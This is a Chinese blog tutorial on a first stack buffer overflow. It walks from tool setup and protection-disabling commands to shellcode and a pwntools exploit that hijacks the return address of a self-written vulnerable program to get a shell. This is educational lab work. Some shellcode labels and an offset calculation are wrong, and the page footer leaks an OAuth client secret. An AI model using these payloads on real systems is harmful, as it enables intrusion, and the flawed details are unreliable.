@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<meta name="referrer" content="never">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CNTF3L2LQC"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CNTF3L2LQC');
+</script>  <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?a2d27f70a2f1f5f5edfb5884096627ae";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script> 
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    
+    <title>
+      PWN 入门 (一) - 白帽酱の博客
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    
+<link rel="stylesheet" href="/style/style.css">
+
+  <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="白帽酱の博客" type="application/atom+xml">
+</head>
+  <body>
+    <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87"><span class="toc-text">工具准备</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85gdb"><span class="toc-text">安装gdb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85pwntools"><span class="toc-text">安装pwntools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-32%E4%BD%8DGCC%E5%BA%93"><span class="toc-text">安装 32位GCC库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">常用命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwntools%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="toc-text">pwntools常用代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E3%81%AE%E7%AE%80%E5%8D%95PWN"><span class="toc-text">第一次の简单PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E7%A8%8B%E5%BA%8F"><span class="toc-text">编译程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN"><span class="toc-text">PWN!</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search" />
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg" />
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class="">
+          首页
+        </a>
+        
+        <a href="/archives" class="">
+          归档
+        </a>
+        
+        <a href="/categories" class="">
+          分类
+        </a>
+        
+        <a href="/tags" class="">
+          标签
+        </a>
+        
+        <a href="/friends" class="">
+          友链
+        </a>
+        
+        <a href="/about" class="">
+          关于
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">白帽酱</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">白帽酱</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="/" class="">
+            首页
+          </a>
+          
+          <a href="/archives" class="">
+            归档
+          </a>
+          
+          <a href="/categories" class="">
+            分类
+          </a>
+          
+          <a href="/tags" class="">
+            标签
+          </a>
+          
+          <a href="/friends" class="">
+            友链
+          </a>
+          
+          <a href="/about" class="">
+            关于
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/burpheart" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="https://twitter.com/burp_heart" target="_block">
+              <span class="iconfont icon-twitter"></span>
+            </a>
+            
+            <a href="https://space.bilibili.com/32890488" target="_block">
+              <span class="iconfont icon-bilibili"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">PWN 入门 (一)</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2022/10/18</span>
+        </span>
+
+        
+
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/PWN">PWN</a>
+                
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/PWN">PWN</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><h1 id="工具准备">工具准备<a class="post-anchor" href="#工具准备"></a></h1><h2 id="安装gdb">安装gdb<a class="post-anchor" href="#安装gdb"></a></h2><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><code class="hljs bash">apt-get update<br>apt install -y gdb<br></code></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg<br><span class="hljs-built_in">cd</span> pwndbg<br> ./setup.sh <br></code></pre></td></tr></tbody></table></figure>
+<h3 id="安装pwntools">安装pwntools<a class="post-anchor" href="#安装pwntools"></a></h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential<br>python3 -m pip install --upgrade pip<br>python3 -m pip install --upgrade pwntools<br></code></pre></td></tr></tbody></table></figure>
+<h3 id="安装-32位GCC库">安装 32位GCC库<a class="post-anchor" href="#安装-32位GCC库"></a></h3><p>apt-get install gcc-multilib</p>
+<h1 id="常用命令">常用命令<a class="post-anchor" href="#常用命令"></a></h1><p>32位编译且关闭内存保护和报错<br>gcc -m32 -O0 -fno-stack-protector -z execstack -o exp exp.c<br>关闭地址随机化(需root，重启后恢复)<br>echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>查看文件属性<br>file exp<br>查看文件保护<br>checksec exp<br>msf定位偏移量<br>msf-pattern_create -l 400<br>msf-pattern_offset -q 4Ab5<br>查看程序导入的函数<br>objdump -R exp<br>查看所有函数以及汇编代码<br>objdump -d exp</p>
+<p>gdb常用命令</p>
+<p>载入程序<br>gdb -q exp<br>带参数载入程序<br>gdb -q -args ./exp AAAA<br>调试的一开始输入(如果断点失败可能需要这条)<br>starti<br>查看main函数<br>disass main<br>查看main函数地址<br>info address main<br>下断点<br>b *0x080491ef<br>b main<br>查看断点<br>info b<br>清除断点<br>d<br>运行<br>r<br>带参数运行<br>r <code>python -r 'print("A"*400)'</code><br>查看进程中的权限<br>vmmap<br>单步执行<br>s<br>执行一行代码<br>n<br>继续到下一个断点<br>c<br>地址运算<br>p/d 0xffffd130-0xffffd100<br>查看50栈空间<br>s 50<br>退出<br>q</p>
+<p>ida常用按键</p>
+<p>反编译<br>F5<br>查看所有字符串<br>shift+F12<br>返回<br>Esc<br>切换图形/汇编视图<br>空格</p>
+<h3 id="pwntools常用代码">pwntools常用代码<a class="post-anchor" href="#pwntools常用代码"></a></h3><p>本地溢出</p>
+<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><code class="hljs plain">from pwn import *<br>p = process('./epwn')payload= p32(0x0804863A)print("a"*112 + payload)p.sendline('a'*112 + payload) p.interactive()<br></code></pre></td></tr></tbody></table></figure>
+
+<p>远程溢出</p>
+<p>p = remote(‘127.0.0.1’,5667)<br>32位shellcode</p>
+<p>print(asm(shellcraft.sh()))<br>64位shellcode</p>
+<p>context.arch = “amd64”print(asm(shellcraft.amd64.sh()))</p>
+<h3 id=""><a class="post-anchor" href="#"></a></h3><p>通用shellcode</p>
+<p>32位</p>
+<p>int main() {    unsigned char shellcode[] = “\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05”;    int (<em>ret)() = (int(</em>)())shellcode;    ret();    return 0;}<br>64位</p>
+<p>void main(){    char shellcode[] = “\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80”;    void (<em>fp)(void);    fp = (void</em>)shellcode;    fp();}<br>如果需要编译<br>gcc -m32 -z execstack shell32.c</p>
+<h1 id="第一次の简单PWN">第一次の简单PWN<a class="post-anchor" href="#第一次の简单PWN"></a></h1><h3 id="编译程序">编译程序<a class="post-anchor" href="#编译程序"></a></h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br>void <span class="hljs-function"><span class="hljs-title">success</span></span>() { <br>    puts(<span class="hljs-string">"You Hava already controlled it."</span>);<br>    system(<span class="hljs-string">"/bin/sh"</span>);<br> }<br>void <span class="hljs-function"><span class="hljs-title">test</span></span>() {<br>    puts(<span class="hljs-string">"Connection Successful."</span>);<br>} <br>void <span class="hljs-function"><span class="hljs-title">vulnerable</span></span>() {<br>  char s[12];//s字符数组空间长度只有12位<br>  gets(s);//gets 从标准输入获取字符放入s中 输入长度没有限制<br>  puts(s);<br>  <span class="hljs-built_in">return</span>;<br>}<br>int main(int argc, char **argv) {<br>  vulnerable();<br>  <span class="hljs-built_in">return</span> 0;<br>}<br></code></pre></td></tr></tbody></table></figure>
+<p>gcc -m32 -z execstack tset.c</p>
+<ul>
+<li>m32 生成32位代码</li>
+<li>execstack 开启可执行栈 (默认GCC 是关闭可执行栈)</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666079825734-c7b3ad9b-5498-4dde-a68a-0f423cde16cf.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=206&amp;id=u1e49f14d&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=257&amp;originWidth=792&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=138775&amp;status=error&amp;style=none&amp;taskId=u1317ff12-2d41-4875-adc6-fa0ed0abdd8&amp;title=&amp;width=633.6" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666079825734-c7b3ad9b-5498-4dde-a68a-0f423cde16cf.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=206&amp;id=u1e49f14d&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=257&amp;originWidth=792&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=138775&amp;status=error&amp;style=none&amp;taskId=u1317ff12-2d41-4875-adc6-fa0ed0abdd8&amp;title=&amp;width=633.6" alt="图片.png"></a></p>
+<h3 id="分析程序">分析程序<a class="post-anchor" href="#分析程序"></a></h3><p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666079945025-8db5af99-3351-4d20-9b54-e53fd6746167.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=214&amp;id=sfiTG&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=267&amp;originWidth=658&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=86429&amp;status=error&amp;style=none&amp;taskId=ue1039c02-ccbd-412a-b07c-16227ee8376&amp;title=&amp;width=526.4" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666079945025-8db5af99-3351-4d20-9b54-e53fd6746167.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=214&amp;id=sfiTG&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=267&amp;originWidth=658&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=86429&amp;status=error&amp;style=none&amp;taskId=ue1039c02-ccbd-412a-b07c-16227ee8376&amp;title=&amp;width=526.4" alt="图片.png"></a><br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666079989560-1563b6be-9241-4971-ada2-44a3138b5879.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=204&amp;id=u94e11e74&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=255&amp;originWidth=723&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=59361&amp;status=error&amp;style=none&amp;taskId=ua07da32d-7396-42b4-8ebf-c26f19f43ce&amp;title=&amp;width=578.4" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666079989560-1563b6be-9241-4971-ada2-44a3138b5879.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=204&amp;id=u94e11e74&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=255&amp;originWidth=723&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=59361&amp;status=error&amp;style=none&amp;taskId=ua07da32d-7396-42b4-8ebf-c26f19f43ce&amp;title=&amp;width=578.4" alt="图片.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666081377973-b61bb7d2-f3fa-4b45-b3ee-3857bce31007.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=315&amp;id=uaf9e3a07&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=394&amp;originWidth=578&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=129217&amp;status=error&amp;style=none&amp;taskId=u73d47e78-4174-4d85-9e0d-40c2b18ee89&amp;title=&amp;width=462.4" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666081377973-b61bb7d2-f3fa-4b45-b3ee-3857bce31007.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=315&amp;id=uaf9e3a07&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=394&amp;originWidth=578&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=129217&amp;status=error&amp;style=none&amp;taskId=u73d47e78-4174-4d85-9e0d-40c2b18ee89&amp;title=&amp;width=462.4" alt="图片.png"></a><br>给gets 打个断点<br>b *地址<br>运行<br>r<br>单步执行<br>n<br>执行到gets 输入字符串<br>打印栈<br>stack+长度<br>stack 30<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666080948466-2275c0d5-4af8-4f7b-826e-b22f0b5179f3.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=362&amp;id=ucc78c3d3&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=453&amp;originWidth=631&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=181638&amp;status=error&amp;style=none&amp;taskId=uc344b2c0-ceac-4956-baca-26a897e491e&amp;title=&amp;width=504.8" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666080948466-2275c0d5-4af8-4f7b-826e-b22f0b5179f3.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=362&amp;id=ucc78c3d3&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=453&amp;originWidth=631&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=181638&amp;status=error&amp;style=none&amp;taskId=uc344b2c0-ceac-4956-baca-26a897e491e&amp;title=&amp;width=504.8" alt="图片.png"></a><br>输入12位字符串<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666081036891-2eade4f6-f9bd-440f-8e99-e860827522f3.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=390&amp;id=ue8760b21&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=488&amp;originWidth=634&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=218858&amp;status=error&amp;style=none&amp;taskId=ua1e5a56f-0393-474d-a932-089c23dfdbf&amp;title=&amp;width=507.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666081036891-2eade4f6-f9bd-440f-8e99-e860827522f3.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=390&amp;id=ue8760b21&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=488&amp;originWidth=634&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=218858&amp;status=error&amp;style=none&amp;taskId=ua1e5a56f-0393-474d-a932-089c23dfdbf&amp;title=&amp;width=507.2" alt="图片.png"></a><br>输入长字符串<br>很明显,用户的输入把一部分代码覆盖掉了<br>s字符数组空间只有12位,gets 输入长度没有限制<br>如果输入超长数据,那么多出的字符会覆盖内存中其他数据  如果覆盖到代码则可能会导致执行异常.<br>00:0000│ esp 0xffffd520 —▸ 0xffffd534 ◂— ‘1234567890ab’<br>01:0004│     0xffffd524 —▸ 0xf7fd7a6c (_dl_fixup+236) ◂— mov    edi, eax<br>02:0008│     0xffffd528 —▸ 0xf7c18482 ◂— ‘_dl_audit_preinit’<br>03:000c│     0xffffd52c —▸ 0x56556220 (vulnerable+12) ◂— add    ebx, 0x2dd4<br>04:0010│     0xffffd530 —▸ 0xffffd570 —▸ 0xf7e20ff4 (<em>GLOBAL_OFFSET_TABLE</em>) ◂— 0x220d8c<br>05:0014│ eax 0xffffd534 ◂— ‘1234’<br>06:0018│     0xffffd538 ◂— ‘5678’<br>07:001c│     0xffffd53c ◂— ‘90ab’<br>08:0020│     0xffffd540 ◂— 0x0<br>09:0024│     0xffffd544 —▸ 0xf7e20ff4 (<em>GLOBAL_OFFSET_TABLE</em>) ◂— 0x220d8c<br>0a:0028│ ebp 0xffffd548 —▸ 0xffffd558 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— …<br>0b:002c│     0xffffd54c —▸ 0x5655625f (main+21) ◂— mov    eax, 0<br>当vulnerable函数执行完后需要通过这个地址返回到main函数来继续执行程序<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666081631237-99e4f8e0-c424-4686-ba20-d4b458b4817d.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=158&amp;id=tqx1X&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=197&amp;originWidth=589&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=59008&amp;status=error&amp;style=none&amp;taskId=u1d6afbd5-e087-4523-9ad8-53853da3296&amp;title=&amp;width=471.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666081631237-99e4f8e0-c424-4686-ba20-d4b458b4817d.png#clientId=u7d3ee990-3ff4-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=158&amp;id=tqx1X&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=197&amp;originWidth=589&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=59008&amp;status=error&amp;style=none&amp;taskId=u1d6afbd5-e087-4523-9ad8-53853da3296&amp;title=&amp;width=471.2" alt="图片.png"></a><br>我们只需要覆盖这块地址上的内存 就可以控制返回地址 达到执行内存中任意已经存在的代码<br>通过简单的计算可得出playload长度<br>0x28-0x14=0x14(24)<br>输入任意24个字符之后加上4位地址就可以准确覆盖原有地址<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666083549455-ff8e38fe-40a1-49ea-9d94-8fb2d0c83e0b.png#clientId=uf3d6684b-25f8-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=282&amp;id=uddbc0873&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=352&amp;originWidth=550&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=109455&amp;status=error&amp;style=none&amp;taskId=ub02939d0-d6e5-428c-b121-431b365beb4&amp;title=&amp;width=440" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666083549455-ff8e38fe-40a1-49ea-9d94-8fb2d0c83e0b.png#clientId=uf3d6684b-25f8-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=282&amp;id=uddbc0873&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=352&amp;originWidth=550&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=109455&amp;status=error&amp;style=none&amp;taskId=ub02939d0-d6e5-428c-b121-431b365beb4&amp;title=&amp;width=440" alt="图片.png"></a><br>题目里提供了一个后门函数<br>函数内执行了 system(“/bin/sh”)<br>我们只要将目标地址设为这个函数地址,就可以执行这个函数来获得一个交互bash shell. 最终达成RCE的目的.</p>
+<h3 id="PWN">PWN!<a class="post-anchor" href="#PWN"></a></h3><p>这里需要注意的是: 32位地址在内存中是小端储存<br>需要转换一下 0x565561ad -&gt;0xad615556<br>最终payload<br>aaaaaaaaaaaaaaaaaaaaaaaa\xad\x61\x55\x56<br>也可以使用pwntools 完成PWN 简化操作</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><code class="hljs bash">from pwn import *<br>p = process(<span class="hljs-string">'./a.out'</span>)<br>payload= p32(0x565561ad)<span class="hljs-comment">#大端地址转换为32位地址 (小端)</span><br>p.sendline(b<span class="hljs-string">'a'</span>*24 + payload)<br>p.interactive()<span class="hljs-comment">#开始终端交互</span><br></code></pre></td></tr></tbody></table></figure>
+<p><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666085805596-07c04389-c020-47ad-a43a-096f8c5d24f3.png#clientId=uf3d6684b-25f8-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=121&amp;id=ue100ddf9&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=151&amp;originWidth=608&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=31051&amp;status=error&amp;style=none&amp;taskId=u3326924e-f7dd-483f-913b-8d2422fa6d4&amp;title=&amp;width=486.4" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1666085805596-07c04389-c020-47ad-a43a-096f8c5d24f3.png#clientId=uf3d6684b-25f8-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;errorMessage=unknown%20error&amp;from=paste&amp;height=121&amp;id=ue100ddf9&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=151&amp;originWidth=608&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=31051&amp;status=error&amp;style=none&amp;taskId=u3326924e-f7dd-483f-913b-8d2422fa6d4&amp;title=&amp;width=486.4" alt="图片.png"></a><br>参考<br> <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xBNB-FLRLafLhAgmMg6Ydw">https://mp.weixin.qq.com/s/xBNB-FLRLafLhAgmMg6Ydw</a><br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/</a></p>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2022/08/23/WMCTF-2022-WRITEUP/">WMCTF 2022 部分 WRITEUP</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="https://rce.moe">白帽酱</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="https://rce.moe/2022/10/18/PWN-BASIC-1/">https://rce.moe/2022/10/18/PWN-BASIC-1/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script type="text/javascript">
+    new Gitalk({
+        clientID: '1488ae49eda310270a91',
+        clientSecret: '83e505f36d0351b0ef1a225d089546cb40ecd31a',
+        repo: 'hexoblog',
+        owner: 'burpheart',
+        admin: 'burpheart',
+        id: md5(location.pathname),
+        distractionFreeMode: true
+    }).render('gitalk-container')
+</script>
+        <footer>
+          <div class="copyright">
+            ©2022
+            <a href="https://rce.moe">白帽酱</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
+            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
